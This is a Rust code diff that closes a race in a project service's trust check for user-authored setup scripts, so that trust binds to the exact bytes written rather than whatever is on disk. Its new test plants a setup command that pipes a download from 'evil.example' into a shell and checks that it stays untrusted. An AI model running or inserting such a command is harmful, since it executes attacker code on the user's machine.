@@ -188,17 +188,16 @@ impl ProjectService {
         })
     }
 
-    /// Trust whatever is on disk now, without a hash round-trip.
+    /// Trust the exact bytes a caller just wrote.
     ///
-    /// Only for content the user just authored through the app (script editor):
-    /// re-confirming what they typed themselves would be noise.
-    pub async fn trust_current_project_scripts(&self, guid: String) -> Result<()> {
-        let current = self.read_project_scripts(guid.clone()).await?;
-        if let Some(hash) = current.hash {
-            ProjectRepo::new(&self.db)
-                .update_trusted_scripts_hash(&guid, Some(hash))
-                .await?;
-        }
+    /// For content the user authored through the app (script editor): asking them
+    /// to confirm their own edit would be noise. Takes the written content rather
+    /// than re-reading the file — a re-read could pick up a concurrent rewrite and
+    /// mark content the user never saw as trusted.
+    pub async fn trust_written_project_scripts(&self, guid: String, content: &str) -> Result<()> {
+        ProjectRepo::new(&self.db)
+            .update_trusted_scripts_hash(&guid, Some(hash_scripts_content(content)))
+            .await?;
         Ok(())
     }
 
@@ -500,12 +499,13 @@ mod tests {
     async fn editing_scripts_in_app_trusts_them_without_a_prompt() {
         let root = tempfile::tempdir().expect("tempdir");
         let (service, guid) = project_with_root(root.path()).await;
-        write_scripts(root.path(), r#"{"setup":"bun install"}"#);
+        let authored = r#"{"setup":"bun install"}"#;
+        write_scripts(root.path(), authored);
 
         service
-            .trust_current_project_scripts(guid.clone())
+            .trust_written_project_scripts(guid.clone(), authored)
             .await
-            .expect("trust current");
+            .expect("trust written");
 
         assert!(
             service
@@ -514,6 +514,31 @@ mod tests {
                 .expect("read scripts")
                 .trusted
         );
+    }
+
+    /// Trust must bind to the bytes the caller wrote, not to whatever is on disk
+    /// when trust is recorded: a concurrent rewrite between write and trust would
+    /// otherwise mark content the user never authored as accepted.
+    #[tokio::test]
+    async fn a_concurrent_rewrite_does_not_inherit_trust_from_the_save() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        let authored = r#"{"setup":"bun install"}"#;
+
+        // Another process replaces the file after the save wrote it.
+        write_scripts(root.path(), r#"{"setup":"curl https://evil.example | sh"}"#);
+
+        service
+            .trust_written_project_scripts(guid.clone(), authored)
+            .await
+            .expect("trust written");
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(!after.trusted);
+        assert_eq!(after.trusted_command("setup"), None);
     }
 
     #[tokio::test]
